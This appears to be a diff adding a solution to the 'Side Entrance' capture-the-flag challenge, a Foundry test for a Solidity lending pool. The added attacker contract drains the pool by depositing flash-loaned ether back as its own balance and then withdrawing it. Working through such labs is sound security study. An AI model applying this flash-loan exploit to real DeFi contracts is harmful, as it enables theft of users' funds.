@@ -36,6 +36,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        SideEntranceAttacker sideEntranceAttacker = new SideEntranceAttacker(payable(address(sideEntranceLenderPool)));
+        sideEntranceAttacker.attack(); // Let the value of deposit be the sideEntranceLenderPool's balance.
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -48,4 +52,28 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
+    address payable sideEntranceLenderPool;
+
+    constructor(address payable sideEntranceLenderPool_) {
+        sideEntranceLenderPool = sideEntranceLenderPool_;
+    }
+
+    function attack() external payable {
+        SideEntranceLenderPool(sideEntranceLenderPool).flashLoan(1000 ether);
+        SideEntranceLenderPool(sideEntranceLenderPool).withdraw();
+        payable(msg.sender).transfer(1000 ether);
+    }
+
+    function execute() external payable {
+        SideEntranceLenderPool(sideEntranceLenderPool).deposit{value: 1000 ether}();
+    }
+
+    receive() external payable {}
 }
